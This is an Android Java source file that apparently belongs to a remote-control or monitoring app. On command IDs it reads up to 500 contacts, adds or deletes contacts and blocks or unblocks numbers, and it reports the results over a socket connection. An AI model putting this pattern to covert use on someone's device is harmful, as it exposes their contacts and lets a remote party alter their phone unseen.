package com.fason.app.features.contacts;

import android.Manifest;
import android.content.ContentProviderOperation;
import android.content.ContentUris;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.BlockedNumberContract;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.RawContacts;
import android.util.Log;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.permissions.PermissionManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import io.socket.client.Socket;

public final class ContactsManager {
    private static final String TAG = "ContactsManager";
    private static final int MAX = 500;

    private ContactsManager() {}

    // ── read ─────────────────────────────────────────────────────────────────

    public static JSONObject getContacts() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();
        try {
            result.put(Protocol.KEY_CONTACTS_LIST, list);
            if (!PermissionManager.canIUse(Manifest.permission.READ_CONTACTS)) {
                result.put(Protocol.KEY_ERROR, "Permission denied");
                return result;
            }
            // v4.0: also pull contact_id and raw_contact_id for delete/edit
            Cursor cur = FasonApp.getContext().getContentResolver().query(
                Phone.CONTENT_URI,
                new String[]{
                    Phone.CONTACT_ID,
                    Phone.RAW_CONTACT_ID,
                    Phone.DISPLAY_NAME,
                    Phone.NUMBER,
                    Phone.TYPE
                },
                null, null,
                Phone.DISPLAY_NAME + " ASC");
            if (cur != null) {
                try {
                    int idIdx   = cur.getColumnIndex(Phone.CONTACT_ID);
                    int rawIdx  = cur.getColumnIndex(Phone.RAW_CONTACT_ID);
                    int nameIdx = cur.getColumnIndex(Phone.DISPLAY_NAME);
                    int numIdx  = cur.getColumnIndex(Phone.NUMBER);
                    int typeIdx = cur.getColumnIndex(Phone.TYPE);
                    int count = 0;
                    while (cur.moveToNext() && count < MAX) {
                        String name   = nameIdx >= 0 ? cur.getString(nameIdx) : "";
                        String phoneNo = numIdx >= 0 ? cur.getString(numIdx) : "";
                        if (name == null) name = "";
                        if (phoneNo == null) phoneNo = "";
                        if (name.isEmpty() && phoneNo.isEmpty()) continue;
                        JSONObject c = new JSONObject();
                        c.put(Protocol.KEY_CONTACT_ID, idIdx >= 0 ? cur.getLong(idIdx) : -1);
                        c.put(Protocol.KEY_NAME, name);
                        c.put(Protocol.KEY_PHONE_NO, phoneNo);
                        if (typeIdx >= 0) c.put(Protocol.KEY_PHONE_TYPE, cur.getInt(typeIdx));
                        list.put(c);
                        count++;
                    }
                } finally {
                    cur.close();
                }
            }
            result.put(Protocol.KEY_TOTAL, list.length());
        } catch (Exception e) {
            try { result.put(Protocol.KEY_ERROR, "Failed: " + e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    // ── delete ────────────────────────────────────────────────────────────────

    /**
     * Delete a contact and all associated data rows by contact_id.
     */
    public static void deleteContact(long contactId, String cmdId) {
        try {
            if (!PermissionManager.canIUse(Manifest.permission.WRITE_CONTACTS)) {
                sendResult("delete_contact", false, "WRITE_CONTACTS denied", cmdId);
                return;
            }
            Uri deleteUri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, contactId);
            int rows = FasonApp.getContext().getContentResolver().delete(deleteUri, null, null);
            sendResult("delete_contact", rows > 0, rows > 0 ? null : "Contact not found", cmdId);
        } catch (Exception e) {
            sendResult("delete_contact", false, e.getMessage(), cmdId);
        }
    }

    // ── add ───────────────────────────────────────────────────────────────────

    /**
     * Add a new contact with a display name and phone number.
     */
    public static void addContact(String name, String phone, String cmdId) {
        try {
            if (!PermissionManager.canIUse(Manifest.permission.WRITE_CONTACTS)) {
                sendResult("add_contact", false, "WRITE_CONTACTS denied", cmdId);
                return;
            }
            if (name == null) name = "";
            if (phone == null) phone = "";
            ArrayList<ContentProviderOperation> ops = new ArrayList<>();
            // Insert raw contact
            ops.add(ContentProviderOperation.newInsert(RawContacts.CONTENT_URI)
                .withValue(RawContacts.ACCOUNT_TYPE, null)
                .withValue(RawContacts.ACCOUNT_NAME, null)
                .build());
            // Set display name
            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE,
                    ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
                .build());
            // Set phone number
            if (!phone.isEmpty()) {
                ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE, Phone.CONTENT_ITEM_TYPE)
                    .withValue(Phone.NUMBER, phone)
                    .withValue(Phone.TYPE, Phone.TYPE_MOBILE)
                    .build());
            }
            FasonApp.getContext().getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            sendResult("add_contact", true, null, cmdId);
        } catch (Exception e) {
            sendResult("add_contact", false, e.getMessage(), cmdId);
        }
    }

    // ── block / unblock ───────────────────────────────────────────────────────

    /**
     * Block a phone number using BlockedNumberContract (Android 7+).
     */
    public static void blockNumber(String number, String cmdId) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            sendResult("block_number", false, "Requires Android 7+", cmdId);
            return;
        }
        try {
            ContentValues cv = new ContentValues();
            cv.put(BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER, number);
            Uri uri = FasonApp.getContext().getContentResolver()
                .insert(BlockedNumberContract.BlockedNumbers.CONTENT_URI, cv);
            sendResult("block_number", uri != null, uri != null ? null : "Insert returned null", cmdId);
        } catch (Exception e) {
            sendResult("block_number", false, e.getMessage(), cmdId);
        }
    }

    /**
     * Unblock a phone number.
     */
    public static void unblockNumber(String number, String cmdId) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            sendResult("unblock_number", false, "Requires Android 7+", cmdId);
            return;
        }
        try {
            Uri lookup = Uri.withAppendedPath(BlockedNumberContract.BlockedNumbers.CONTENT_FILTER_URI, Uri.encode(number));
            int rows = 0;
            android.database.Cursor c = FasonApp.getContext().getContentResolver().query(
                    lookup, new String[]{BlockedNumberContract.BlockedNumbers.COLUMN_ID}, null, null, null);
            if (c != null) {
                try {
                    while (c.moveToNext()) {
                        long id = c.getLong(0);
                        Uri row = ContentUris.withAppendedId(BlockedNumberContract.BlockedNumbers.CONTENT_URI, id);
                        rows += FasonApp.getContext().getContentResolver().delete(row, null, null);
                    }
                } finally {
                    c.close();
                }
            }
            sendResult("unblock_number", rows > 0, rows > 0 ? null : "Number not blocked", cmdId);
        } catch (Exception e) {
            sendResult("unblock_number", false, e.getMessage(), cmdId);
        }
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private static void sendResult(String action, boolean success, String error, String cmdId) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, "contact_action_result");
            r.put(Protocol.KEY_ACTION, action);
            r.put(Protocol.KEY_SUCCESS, success);
            if (error != null) r.put(Protocol.KEY_ERROR, error);
            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.CONTACTS, r);
        } catch (Exception ignored) {}
    }
}
